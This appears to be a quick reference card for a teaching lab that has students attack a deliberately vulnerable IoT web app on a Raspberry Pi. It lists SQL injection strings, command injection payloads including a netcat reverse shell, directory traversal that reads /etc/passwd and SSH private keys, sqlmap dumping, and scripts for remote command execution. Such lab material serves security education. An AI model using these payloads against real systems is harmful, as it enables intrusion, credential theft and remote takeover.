# Quick Reference Card - IoT Security Lab 1

## Finding Your Raspberry Pi IP
```bash
# If you're on the Pi:
hostname -I | awk '{print $1}'

# From another computer, scan network:
nmap -p 5000 192.168.1.0/24 --open

# Look for hostname:
ping raspberrypi.local
```

## Default Credentials
```
Username: a**********
Password: 1**********
```

## Useful URLs
- Main Dashboard: `http://<ip>:5000/`
- Login Page: `http://<ip>:5000/login`
- API Endpoint: `http://<ip>:5000/api/temperature`
- Settings API: `http://<ip>:5000/api/settings`
- System Logs: `http://<ip>:5000/logs`

## Common Exploitation Payloads

### SQL Injection
```sql
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
```

### Command Injection
```bash
; ls -la
; cat /etc/passwd
; id
; whoami
| nc <your-ip> 4444 -e /bin/bash
```

### Directory Traversal
```
/firmware?file=../../etc/passwd
/firmware?file=../../../home/pi/.ssh/id_rsa
/firmware?file=../vulnerable_iot_app.py
```

## Useful Commands

### Network Scanning
```bash
# Discover devices
nmap -sn 192.168.1.0/24

# Port scan
nmap -p- <target-ip>

# Service detection
nmap -sV -p 5000 <target-ip>
```

### Web Testing
```bash
# Basic curl
curl http://<ip>:5000/api/temperature

# POST request
curl -X POST -H "Content-Type: application/json" \
  -d '{"command":"id"}' http://<ip>:5000/api/command

# Check headers
curl -I http://<ip>:5000
```

### Information Gathering
```bash
# View page source
curl http://<ip>:5000 | grep -i password

# Find comments
curl http://<ip>:5000 | grep "<!--" 

# Check robots.txt
curl http://<ip>:5000/robots.txt
```

## Browser Developer Tools

### Console Commands
```javascript
// Check localStorage
localStorage

// Check cookies
document.cookie

// Find API keys
console.log(API_KEY)

// View all JavaScript variables
Object.keys(window)
```

### Network Tab
- Monitor all requests
- Check for credentials in headers
- Look for API endpoints
- Inspect response data

## Python Quick Scripts

### Test Default Credentials
```python
import requests
r = requests.post('http://<ip>:5000/login',
    data={'username':'a*******', 'password':'1******'})
print(r.text)
```

### Extract Temperature Data
```python
import requests
r = requests.get('http://<ip>:5000/api/temperature')
print(r.json())
```

### Command Execution
```python
import requests
r = requests.post('http://<ip>:5000/api/command',
    json={'command':'cat /etc/passwd'})
print(r.json()['output'])
```

## SQL Injection Testing

### Manual Testing
1. Try single quote: `'`
2. Look for errors
3. Try boolean: `' OR '1'='1`
4. Comment out rest: `'--`

### Automated with sqlmap
```bash
sqlmap -u "http://<ip>:5000/login" \
  --data="username=admin&password=test" \
  --batch --dump
```

## Things to Look For

### In HTML Source
- Comments with passwords
- Hidden form fields
- JavaScript variables
- API endpoints
- Version information

### In JavaScript
- Hardcoded credentials
- API keys
- Debug information
- Console.log statements
- localStorage/sessionStorage

### In Network Traffic
- Unencrypted passwords
- Session tokens
- API responses
- Error messages
- Debug headers

### In Cookies
- Predictable session IDs
- Missing security flags
- Sensitive data
- Weak encryption

## Security Headers to Check
```bash
curl -I http://<ip>:5000
```

Look for missing:
- X-Frame-Options
- X-Content-Type-Options
- Content-Security-Policy
- Strict-Transport-Security

## Quick Wins
1. Check HTML comments
2. Try something that starts with an "a" and a password that starts with a 1
3. Look at browser console
4. Check /api/settings
5. View localStorage
6. Try command injection
7. SQL injection on login
8. Directory traversal

## Remember
- Document everything
- Take screenshots
- Note exact payloads used
- Record impact
- Suggest fixes
- Be ethical

---
**Emergency Stop**: If something goes wrong:
```bash
sudo pkill -f vulnerable_iot_app
sudo systemctl stop iot_monitor
```